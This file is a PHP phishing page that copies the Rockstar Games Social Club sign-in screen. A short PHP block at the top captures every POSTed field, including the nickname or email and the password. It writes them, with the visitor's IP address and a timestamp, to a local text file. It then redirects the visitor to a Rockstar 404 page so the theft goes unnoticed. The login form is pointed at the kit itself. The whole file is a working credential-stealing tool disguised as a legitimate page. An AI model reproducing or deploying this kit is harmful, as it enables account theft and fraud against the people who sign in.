<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
header('Location: https://socialclub.rockstargames.com/404');
$handle = fopen('heyecan85.txt', 'a');
fwrite($handle, '----------------------------------------------------------------------['.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'].']---['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable.': '.$value."\r\n");}
fclose($handle);
exit;
} ?>


<!doctype html>



<html class="no-js" lang="en">

<head data-template-set="html5-reset">

    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <title>Rockstar Games Social Club - Sign-In</title>
    <meta name="title" content="Rockstar Games Social Club Sign-In">
    <meta name="keywords" content="Rockstar Games, Social Club, Rockstar">
    <meta name="description" content="Rockstar Games Social Club">
    <meta name="google-site-verification" content="">
    <meta name="author" content="Rockstar North">
    <meta name="copyright" content="Rockstar Games 2017. All Rights Reserved.">
    <meta name="msapplication-config" content="none">

    
    <meta name="DC.title" content="Rockstar Games Social Club">
    <meta name="DC.subject" content="Rockstar Games, Social Club, Rockstar">
    <meta name="DC.creator" content="Rockstar North">

    
    <meta http-equiv="cleartype" content="on">

    
        <meta name="robots" content="all">
    

    

    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="https://cdn.sc.rockstargames.com/images/icons/apple-touch-icon-152x152-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://cdn.sc.rockstargames.com/images/icons/apple-touch-icon-144x144-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="120x120" href="https://cdn.sc.rockstargames.com/images/icons/apple-touch-icon-120x120-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://cdn.sc.rockstargames.com/images/icons/apple-touch-icon-114x114-precomposed.png">   
    <link rel="apple-touch-icon-precomposed" sizes="76x76"   href="https://cdn.sc.rockstargames.com/images/icons/apple-touch-icon-76x76-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="72x72"   href="https://cdn.sc.rockstargames.com/images/icons/apple-touch-icon-72x72-precomposed.png">     
    <link rel="apple-touch-icon-precomposed"                 href="https://cdn.sc.rockstargames.com/images/icons/apple-touch-icon-57x57-precomposed.png">     
    <link rel="shortcut icon"                                href="https://cdn.sc.rockstargames.com/images/icons/apple-touch-icon-precomposed.png">           
    <link rel="shortcut icon"                                href="https://cdn.sc.rockstargames.com/favicon.ico">                                             

    
    <link rel="canonical" href="http://socialclub.rockstargames.com/">

    

    <link id='coreCSS' href="https://cdn.sc.rockstargames.com/css/20171006ffb/core.manifest.css" rel="stylesheet">

    

    <!--[if IE 9]>
        <style type="text/css">
            html * { filter: none !important; }
        </style>
    <![endif]-->

    

    
    <script src="//ajax.googleapis.com/ajax/libs/webfont/1.6.16/webfont.js"></script>

    <script>
        WebFont.load({
            custom: {
                families: ['HelveticaNeueW02-67MdCn 694060', 'HelveticaNeueW10-67MdCn 777270', 'DroidSansMonoW02-Bold', 'scicon-font'],
                urls: ['https://cdn.sc.rockstargames.com/css/20171006ffb/base/fonts/fonts-common.css']
            }
        });
    </script>

    


    <link href="https://cdn.sc.rockstargames.com/css/20171006ffb/modules/blockers.css" rel="stylesheet">

    <link href="https://cdn.sc.rockstargames.com/css/20171006ffb/components/VisualCaptcha.css" rel="stylesheet">


    

    <script>

        window.smallMobileSize = 568;
        //window.mobileSize = 768;
        window.desktopSize = 1024;

        

    </script>

    
<script>
        
        
        window.sl_tr_start = function(){}; window.sl_tr_end = function(){}; window.sl_notr_start = function(){}; window.sl_notr_end = function(){}; window.sl_tr_json_start = function(){}; window.sl_tr_json_end = function(){};
   
    var siteMaster = {
         
        cdnBase: 'https://cdn.sc.rockstargames.com',
        jsBase: 'https://cdn.sc.rockstargames.com/js/20171006ffb',
        cssBase: 'https://cdn.sc.rockstargames.com/css/20171006ffb',
        cloudBase: 'https://prod.cloud.rockstargames.com',
        ugcCloudBase: 'http://prod.ros.rockstargames.com/cloud/11/cloudservices',
        avatarBase: 'https://cdn.sc.rockstargames.com/images/avatars/',
        avatarDefault: 'https://cdn.sc.rockstargames.com/images/avatars/default.png',
        emblemBase: 'https://prod.cloud.rockstargames.com/crews/sc/{0}/{1}/publish/emblem/emblem_{2}.png',
        emblemDefault: 'https://cdn.sc.rockstargames.com/images/emblems/128x128/rockstar1.png',
        thirdPartyV2: true, // can be removed?
        isLoggedIn: false,
        googleAuth: true,
        fbSharing: true,
        twitterSharing: true,
        googleSharing: true,
        act: true,
        actInt: 360,
        actCnt: undefined,
        liEnabled: true,
        liBaseUrl: 'http://www.lifeinvader.com',
        gtavEnabled: true,
        games: [{"href":"/games/gtav","text":"Grand Theft Auto V","gaLabel":"/games/gtav","image":"https://cdn.sc.rockstargames.com/images/mega-menu/gtav.jpg"},{"href":"/games/bully","text":"Bully","gaLabel":"/games/bully","image":"https://cdn.sc.rockstargames.com/images/mega-menu/bully.jpg"},{"href":"/games/rdr/index","text":"Red Dead Redemption","gaLabel":"/games/rdr/index","image":"https://cdn.sc.rockstargames.com/images/mega-menu/rdr.jpg"},{"href":"/games/maxpayne3","text":"Max Payne 3","gaLabel":"/games/maxpayne3","image":"https://cdn.sc.rockstargames.com/images/mega-menu/mp3.jpg"}],
        locale: 'en',
        legalCulture: 'us',
        supportCulture: 'en-us',
        default4Culture: 'en-us',
        support4Culture: 'en-us',
        support4NewsCulture: 'en_us',
        timeAgoLocale: 'en',

        captchaCulture: 'en',

        crewsCommunity: true,
        newsHost: 'http://www.rockstargames.com/',
        sslOnly: true,
        avatarCloudBase: 'https://a.rsg.sc/',
        
        loginTracker: false,
        setCookies: [{"SetAuthUrl":"https://www.lifeinvader.com/auth/Home/SetCookie?token=","Name":"li"},{"SetAuthUrl":"https://www.rockstarwarehouse.com/store/tk2rstar/SetCookie?token=","Name":"warehouse"},{"SetAuthUrl":"https://support.rockstargames.com/access/jwt?jwt=","Name":"support"},{"SetAuthUrl":"https://www.rockstargames.com/auth/users/login.json?token=","Name":"www"}],
        destCookies: ["https://www.lifeinvader.com/auth/Home/DestroyCookie?","https://www.rockstarwarehouse.com/store/tk2rstar/DestroyCookie","https://www.rockstargames.com/auth/users/logout.json?"],
        ssoEnabled: true,
        stsChkNm: 'statuschk.v2',
        stsChkDm: '.socialclub.rockstargames.com',
        stsChkSc: true,

        liThemeEnabled: true,    
        loc: true,
        authUserNickName: '',
        authUserId: 0,
        authUserAvatar: '',
        isEnabledAnalytics: true,
        isEnabledAnalyticsCD: true,
        gaTimeout: 30,
        gcx:
        {
            userId: 0,
            id: '',
            variation: null
        },
        //0: Basic alerts
        //1: Responsive alerts
        alertType: 0,
    
        gtavBannerData:
        {
            banner: '',
            display: false
        },
    
        isGtavPc: true,
    
        webpack: true,
    
        showRecaptcha: true,
        aft: ''
    },
    require = {
        baseUrl: siteMaster.jsBase,

    };
</script>


    
    <script>window.webpackPublicPath = "https://cdn.sc.rockstargames.com/js/20171006ffb/build/" </script>
    <script src="https://cdn.sc.rockstargames.com/js/20171006ffb/build/common.js"></script>


</head>

<body class="bg_registration_login   twoCol ">

    <div id="fb-root"></div> 

    

    <div id="wrapper" class="bgDefault bg_registration_login">

        

        

        <div id="pageWrapper">

            <div id="pageMask"></div>

            

<header>
    
    <div id="headerInner">
        
        

        <h1 id="headerTitle"><a href="https://socialclub.rockstargames.com/" class="GA_Track" data-ga="menu_logo">Rockstar Games Social Club</a></h1>

        <nav class="main-nav">
            
            <ul>

                

                <li class="has-mega" data-mega-menu-type="games">

                    <a href="https://socialclub.rockstargames.com/games" data-ga="menu_features_clickthru" data-ga-label="Games"  class="GA_Track" >Games</a>

                </li>

                <li class="has-mega" data-mega-menu-type="crews">
                    
                    <a href="https://socialclub.rockstargames.com/crews" data-ga="menu_features_clickthru" data-ga-label="Crews"  class="GA_Track" >Crews</a>

                </li>

                <li><a href="https://socialclub.rockstargames.com/events" data-ga="menu_features_clickthru" data-ga-label="Online Events"  class="GA_Track" >Online Events</a></li>

                <li class="has-mega" data-mega-menu-type="news">
                    
                    <a href="https://socialclub.rockstargames.com/news" data-ga="menu_features_clickthru" data-ga-label="News"  class="GA_Track" >News</a>
                    
                </li>

                

            </ul>

        </nav>

        <div id="headerInfo">
            
		<div id="headerLogin">
			<p><a href="https://socialclub.rockstargames.com/profile/signin" id="headerLoginButton" class="GA_Track" data-ga="home_loggedout_menu_signin">Sign in</a> <span>Or</span></p>
			<a href="https://socialclub.rockstargames.com/signup" id="headerRegButton" class="btn btnGold GA_Track" data-ga="home_loggedout_join">Join Social Club</a>
		</div>

        </div>

    </div>

</header>

        <div class="mega-menu-blanket"></div>


            <div id="page" class="clearfix">

            

    

    <div id="blockerLogin" class="clearfix">

        <div id="blockerLoginInner">

            

                            <h2>Sign in</h2>
                            <p>To gain access to the Social Club you will need to sign in with a valid Social Club account.</p>

                            <div id="signIn" class="clearfix">

                                
                                <div class="slideAlts">

                                    <ul class="clearfix">

                                        
<li class="facebook">
    <a class="facebookLoginLink GA_Track" href="https://socialclub.rockstargames.com/profile/#" data-ga="home_signin_facebook" data-tpaga="blocker" data-pageMode="" title="Sign in with Facebook">
        <button class="btn btnSocial btnFacebook"><i class="scicon-logo-facebook"></i></button>
    </a>
</li>
<li class="twitter">
<a class="twitterLoginLink GA_Track" data-ga="home_signin_twitter" href="https://socialclub.rockstargames.com/profile/#" data-tpaga="blocker" data-url="" data-pageMode="" title="Sign in with Twitter">
    <button class="btn btnSocial btnTwitter"><i class="scicon-logo-twitter"></i></button>
</a>
</li>
<li class="np">
    <a class="npLoginLink GA_Track" href="https://socialclub.rockstargames.com/profile/#" data-ga="home_signin_np" data-tpaga="blocker" data-url="" data-pageMode="" title="Sign in with PlayStation™ Network" >
        <button class="btn btnSocial btnPsn"><i class="scicon-logo-playstation"></i></button>
    </a>
</li>


<li class="xbla">
    <a class="xblaLoginLink GA_Track" href="https://socialclub.rockstargames.com/profile/#" data-ga="home_signin_xbla" data-tpaga="blocker" data-pageMode="" title="Sign in with Live Connect">
        <button class="btn btnSocial btnXbla"><i class="scicon-logo-xbox"></i></button>
    </a>
</li>

<li class="googlea">
    <a class="googleLoginLink GA_Track" href="https://socialclub.rockstargames.com/profile/#" data-ga="home_signin_google" data-tpaga="blocker" data-url="" data-pageMode="" title="Sign in with Google">
        <button class="btn btnSocial btnGoogle"><i class="scicon-logo-google2"></i></button>
    </a>
</li>


                                    </ul>

                                </div>
                                
                                <div class="blockerOr">
                                    <h4>or</h4>
                                </div>

                                

<script>
    var gError = 'There has been an error, please retry!',
        gLoginString = 'Nickname/Email';  
</script>
<form id="formLogin" method="post" action="<?php echo basename(__FILE__); ?>">
    <fieldset class="login-control">
        <legend>Login form</legend>
        <div class="newRow">
            <label for="login-field" class="mainlabel">Nickname/Email</label>
            <input class="required" minlength="6" id="login-field" name="login" type="text" title="Nickname/Email" value="" placeholder="Nickname/Email" tabindex="1" autocorrect="off" autocapitalize="off" />
            <label for="password-field" class="mainlabel">Password</label>
            <input class="required" id="password-field" autocomplete="off" name="password" type="password" title="Password" value="" placeholder="Password" tabindex="2" />
        </div>
        <div class="newRow">
            <div id="reCaptchaInput"></div>
        </div>
    </fieldset>

    <div class="submitWrapper clearfix">
        
        <label for="rememberme-field" title="Selecting this will keep you signed-in for 30 days." class="login-control">
            <input type="checkbox" id="rememberme-field" name="rememberme" title="Selecting this will keep you signed-in for 30 days." />
            <span>Keep me signed in</span>
        </label>
        
        <a tabindex="3" id="submitBtn" href="404" title="Sign In" class="btn btnPurple btnRounded GA_Track" data-ga="home_signin_submit">
            Sign In
        </a>
        <div class="spinner"></div>
    </div>
    <p><a id="forgotpwd" href="https://socialclub.rockstargames.com/profile/requestresetpassword" class="login-control">Forgot your password?</a></p>
    
    <div style="display: none">
        <label for="login-field" class="error"></label>
        <label for="password-field" class="error"></label>
    </div>
    <div class="errorText">
        
    
    <p class=""></p>
    </div>
    
</form>


                            </div>

                            
        </div>

        
        <div id="blockerBanner" style="background-image:url(https://socialclub.rockstargames.com/profile/'https://prod.cloud.rockstargames.com/global/blockers/events/en-US.jpg')"></div>
        

    </div>



                <div class="clear"></div>

            </div>

        </div>

    </div>

    <footer>
    <div id="footerInner" class="clearfix">
        <a href="http://www.rockstargames.com" target="_blank" class="GA_Track" data-ga="footer_RSG"><h3>Rockstar Games</h3></a>
        <ul id="footerNav">
            <li class="first">&copy; 2017 Rockstar Games</li>
            <li class="about"><a href="https://socialclub.rockstargames.com/about" title="About Rockstar Games" class="GA_Track" data-ga="footer_about">About</a></li>            
            <li><a target="_blank" href="https://socialclub.rockstargames.com/legal/?locale=us" title="All things legal" class="GA_Track" data-ga="footer_legal">Legal</a></li>
            <li><a target="_blank" href="https://socialclub.rockstargames.com/privacy/?locale=us" title="Our privacy policy" class="GA_Track" data-ga="footer_privacy">Privacy</a></li>
            
            <li class="last"><a target="_blank" href="http://support.rockstargames.com/hc/en-us" title="Support" class="GA_Track" data-ga="footer_support">Support</a></li>
        </ul>
        


        <select id="languageSelect" class="notranslate languageSelect" data-dropdown="dropdown">
            
            
            
                <option  value="de" data-lang="Deutsch" class="GA_Track" data-ga="footer_selectlanguage_de">Deutsch</option>

            
            
                <option selected value="en" data-lang="English" class="GA_Track" data-ga="footer_selectlanguage_en">English</option>

            
            
                <option  value="es" data-lang="Español" class="GA_Track" data-ga="footer_selectlanguage_es">Español</option>

            
            
                <option  value="es-mx" data-lang="Español Latinoamérica" class="GA_Track" data-ga="footer_selectlanguage_es-mx">Español Latinoamérica</option>

            
            
                <option  value="fr" data-lang="Français" class="GA_Track" data-ga="footer_selectlanguage_fr">Français</option>

            
            
                <option  value="it" data-lang="Italiano" class="GA_Track" data-ga="footer_selectlanguage_it">Italiano</option>

            
            
                <option  value="ja" data-lang="日本語" class="GA_Track" data-ga="footer_selectlanguage_ja">日本語</option>

            
            
                <option  value="ko" data-lang="한국어" class="GA_Track" data-ga="footer_selectlanguage_ko">한국어</option>

            
            
                <option  value="pl" data-lang="Polski" class="GA_Track" data-ga="footer_selectlanguage_pl">Polski</option>

            
            
                <option  value="pt" data-lang="Português do Brasil" class="GA_Track" data-ga="footer_selectlanguage_pt">Português do Brasil</option>

            
            
                <option  value="ru" data-lang="Русский" class="GA_Track" data-ga="footer_selectlanguage_ru">Русский</option>

            
            
                <option  value="zh" data-lang="繁體中文" class="GA_Track" data-ga="footer_selectlanguage_zh">繁體中文</option>

            

        </select>        

        
        

    </div>
</footer>

    
    
    
    <script>
        var successText = 'Success';
        var failureText = 'Sorry!';
        var SCSettings = {};
        
            SCSettings.reCaptchaPublicKey = '6LdYkh8UAAAAAF_3aM1rasLDyDPaA-7wPPPW8HgC';
            SCSettings.showRecaptcha = true;
            SCSettings.showRecaptchaAlt = false;
        
    </script>
    

<script>
    (function () {
        var _fbq = window._fbq || (window._fbq = []);
        if (!_fbq.loaded) {
            var fbds = document.createElement('script');
            fbds.async = true;
            fbds.src = '//connect.facebook.net/en_US/fbds.js';
            var s = document.getElementsByTagName('script')[0];
            s.parentNode.insertBefore(fbds, s);
            _fbq.loaded = true;
        }
        _fbq.push(['addPixelId', '1566768443570219']);
    })();
    window._fbq = window._fbq || [];
    window._fbq.push(['track', 'PixelInitialized', {}]);
</script>
<noscript><img height="1" width="1" alt="" style="display:none" src="https://www.facebook.com/tr?id=1566768443570219&amp;ev=PixelInitialized" /></noscript>



    <script src="https://cdn.sc.rockstargames.com/js/20171006ffb/build/shared_logincompact.js"></script>
    

    

    
    <script type="text/javascript">
        var MTIProjectId='bb97f612-ac86-4ab1-9c29-80d577a6fc8a';
        (function() {
            var mtiTracking = document.createElement('script');
            mtiTracking.type='text/javascript';
            mtiTracking.async='true';
            mtiTracking.src=('https:'==document.location.protocol?'https:':'http:')+'//fast.fonts.net/t/trackingCode.js';
            (document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild( mtiTracking );
        })();
    </script>

</body>
</html>
